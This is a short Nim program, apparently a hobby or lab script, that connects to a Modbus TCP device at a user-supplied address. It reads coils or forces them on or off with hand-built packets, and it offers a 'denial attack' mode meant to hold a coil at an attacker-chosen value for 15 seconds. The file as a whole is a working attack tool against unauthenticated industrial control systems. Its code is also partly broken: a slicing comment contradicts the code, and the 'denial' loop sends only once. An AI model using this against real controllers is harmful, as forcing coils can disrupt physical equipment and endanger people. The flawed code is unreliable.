import std/[net, times, os]
import strutils


proc trimUpper(num: string): string =
  if num.len >= 2:
    return num[^4..^3]  # Slicing the last two characters. Really cool thing that I never knew I could do!
  else:
    return num  # Return the entire string if it's less than 2 characters

proc trimLower(num: string): string =
  if num.len >= 2:
    return num[^2..^1]  
  else:
    return num  # Return the entire string if it's less than 2 characters

proc getUpperLower(coilString: string): (uint8, uint8) =
    let upper = uint8(parseHexInt("0x" & trimUpper(coilString))) #Parse it as an int then that gets it to the point where we can cast it
    let lower = uint8(parseHexInt("0x" & trimLower(coilString))) #Super cool functionality to convert to Hex!
    return (upper, lower)

proc timer(): string =
        const message: string = "Time is "
        let startTime: DateTime = now()
        let countdownTime = initDuration(seconds = 15)

        var elapsedTime: Duration = initDuration()

        while countdownTime > elapsedTime:
            sleep(100)
            let currentTime: DateTime = now()
            elapsedTime = currentTime - startTime
            let timeLeft = countdownTime - elapsedTime
            let totalSeconds: int64 = timeLeft.inSeconds
            let minutes: int64 = totalSeconds div 60
            let seconds: int64 = totalSeconds mod 60
            echo message, minutes, ':', seconds         #Prints the timer count down

        return "Completed"

var
    ip = "192.168.7.227"
    port = 502
    socket: Socket = newSocket()
    packet: array[12, uint8]
    denial: int

echo "Please enter an IP address: "
ip = readLine(stdin);
echo "Please enter a port number (default Modbus port is 502)"
port = readLine(stdin).parseInt()

echo "Attempting to connect to " & ip & ":" & $port
socket.connect(ip, Port(port))

echo "What coil would you like to work with?"
var coil = readLine(stdin).parseInt()

let coilString = coil.toHex()
let (upper, lower) = getUpperLower(coilString)

echo "Would you like to read(0) or write(1) to a coil?"
let selection = readLine(stdin).parseInt()

if selection == 1:
    echo "Would you like to write a (1) or a (0)?"
    let selectionWrite = readLine(stdin).parseInt()
    echo "Would you like to run a denial attack yes (1) or no (0)?"
    denial = readLine(stdin).parseInt()

    #Create packet to write coil
    if selectionWrite == 1:
        packet = [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, upper, lower, 0xFF, 0x00];
    else:
        packet =   [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, upper, lower, 0x00, 0x00];
else:
    packet = [0x00'u8, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x01, upper, lower, 0x00, 0x00];

var dataPtr1: ptr array = packet.addr
var output: int

if denial == 1:
    #Runs a denial attack (forces the value to stay set on what the attacker wants) for 15 seconds
    while true:
        output = socket.send(dataPtr1, sizeof(packet))
        var val: string = timer()
        echo val
        if val == "Completed":
            break
else:
    output = socket.send(dataPtr1, sizeof(packet))
    echo output

